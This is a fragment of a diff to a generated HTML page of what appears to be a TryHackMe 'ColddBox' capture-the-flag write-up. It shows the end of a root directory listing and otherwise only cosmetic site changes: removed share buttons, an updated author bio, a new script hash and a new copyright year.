+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">2</span> root root <span class="m">4096</span> sep <span class="m">24</span> 16:54 .nano
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> root root  <span class="m">148</span> ago <span class="m">17</span>  <span class="m">2015</span> .profile
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> root root   <span class="m">49</span> sep <span class="m">24</span> 18:23 root.txt
+</span></span><span class="line"><span class="cl"><span class="c1"># cat root.txt | wc -c</span>
+</span></span><span class="line"><span class="cl"><span class="m">49</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div>
     </article>
@@ -2690,29 +2688,6 @@ drwxr-xr-x  <span class="m">2</span> root root <span class="m">4096</span> sep <
   
 </script>
     
-<div class="donation">
-  <div class="donation__message">
-    Share on
-  </div>
-  <div class="donation__icons">
-    
-    
-    
-      
-        <a href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fmartinkubecka.github.io%2fposts%2fthm%2fcolddbox%2f" title="Facebook" aria-label="Facebook Share Button" class="donation__item" target="_blank" rel="noreferrer" data-type="share">
-          <svg data-name="facebook" enable-background="new 0 0 24 24" viewBox="0 0 24 24" width="35" height="35" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path d="m15.997 3.985h2.191v-3.816c-.378-.052-1.678-.169-3.192-.169-3.159 0-5.323 1.987-5.323 5.639v3.361h-3.486v4.266h3.486v10.734h4.274v-10.733h3.345l.531-4.266h-3.877v-2.939c.001-1.233.333-2.077 2.051-2.077z"/></svg>
-        </a>
-      
-    
-      
-        <a href="https://twitter.com/intent/tweet?text=ColddBox%20%5bTryHackMe%5d&url=https%3a%2f%2fmartinkubecka.github.io%2fposts%2fthm%2fcolddbox%2f&hashtags=exploitation%2cprivilege%20escalation%2cbrute%20force%2cwordpress&via=" title="Twitter" aria-label="Twitter Share Button" class="donation__item" target="_blank" rel="noreferrer" data-type="share">
-          <svg data-name="twitter" enable-background="new 0 0 24 24" viewBox="0 0 24 24" width="35" height="35" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path d="m21.534 7.113c.976-.693 1.797-1.558 2.466-2.554v-.001c-.893.391-1.843.651-2.835.777 1.02-.609 1.799-1.566 2.165-2.719-.951.567-2.001.967-3.12 1.191-.903-.962-2.19-1.557-3.594-1.557-2.724 0-4.917 2.211-4.917 4.921 0 .39.033.765.114 1.122-4.09-.2-7.71-2.16-10.142-5.147-.424.737-.674 1.58-.674 2.487 0 1.704.877 3.214 2.186 4.089-.791-.015-1.566-.245-2.223-.606v.054c0 2.391 1.705 4.377 3.942 4.835-.401.11-.837.162-1.29.162-.315 0-.633-.018-.931-.084.637 1.948 2.447 3.381 4.597 3.428-1.674 1.309-3.8 2.098-6.101 2.098-.403 0-.79-.018-1.177-.067 2.18 1.405 4.762 2.208 7.548 2.208 8.683 0 14.342-7.244 13.986-14.637z"/></svg>
-        </a>
-      
-    
-  </div>
-</div>
-
 
     
     
@@ -2738,7 +2713,7 @@ drwxr-xr-x  <span class="m">2</span> root root <span class="m">4096</span> sep <
     </div>
     <div class="whoami__desc">
       
-        Computer Science student interested in Penetration Testing, Cyber Defense, OSINT and Social Engineering
+        Cyber Security Analyst | Master&#39;s student of Computer Science
       
     </div>
     <div class="whoami__social">
@@ -2925,7 +2900,7 @@ drwxr-xr-x  <span class="m">2</span> root root <span class="m">4096</span> sep <
 </div>
 
 
-<script defer src="/js/swipe.min.b4b82839155519d9ca67746615a4c86ccbc1061c196fe6d8aa26e4fe22902718.js"></script>
+<script defer src="/js/swipe.min.9d61b979db5cc2a1ff3a5d410e881547a61b9d28bc23e811c49061d47df07ef3.js"></script>
 
 <script defer src="/js/micromodal.min.de01b44b2f383056bbcaf6ee921fd385d79108ec1129afd0eb2f3f5a07e11f45.js"></script>
 
@@ -3953,7 +3928,7 @@ document.addEventListener('DOMContentLoaded', function () {
                 
             <p class="caption">
                 
-                    ©2022, All Rights Reserved
+                    ©2023, All Rights Reserved
                 
             </p>
         
